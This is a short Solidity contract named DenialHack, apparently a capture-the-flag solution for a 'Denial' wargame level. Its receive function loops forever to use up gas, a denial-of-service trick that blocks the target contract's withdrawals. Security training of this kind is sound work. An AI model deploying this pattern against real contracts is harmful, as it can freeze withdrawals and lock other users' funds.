// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import {Denial} from "./Denial.sol";

contract DenialHack {
    Denial denial;

    constructor(Denial _denial) {
        denial = _denial;
    }

    receive() external payable {
        while (true) {}
    }
}
